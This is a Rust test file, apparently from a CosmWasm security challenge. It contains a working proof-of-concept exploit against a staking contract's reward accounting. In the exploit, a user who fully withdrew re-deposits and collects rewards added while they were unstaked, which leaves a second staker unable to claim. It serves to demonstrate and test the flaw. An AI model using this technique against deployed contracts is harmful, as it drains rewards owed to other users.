#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{coin, Addr, Uint128};
    use cw_multi_test::Executor;

    use crate::{
        contract::{DENOM, REWARD_DENOM},
        integration_tests::tests::{
            mint_reward_tokens, mint_tokens, proper_instantiate, OWNER, USER, USER2,
        },
        msg::{ExecuteMsg, QueryMsg},
        state::UserRewardInfo,
    };

    pub const ATTACKER: &str = "awesomwasm";

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // user withdraw all funds
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // user claim rewards
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // new user2 join
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // owner increases reward
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.staked_amount, Uint128::zero());
        assert_eq!(user_info.pending_rewards, Uint128::zero());

        // user1 joins back
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // user1 have rewards even though did not stake before owner calls IncreaseReward
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.pending_rewards, Uint128::new(10_000));

        // once user1 claim rewards, user2 wouldn't be able to claim theirs
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // user2 claim rewards
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr,
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap_err();
    }
}
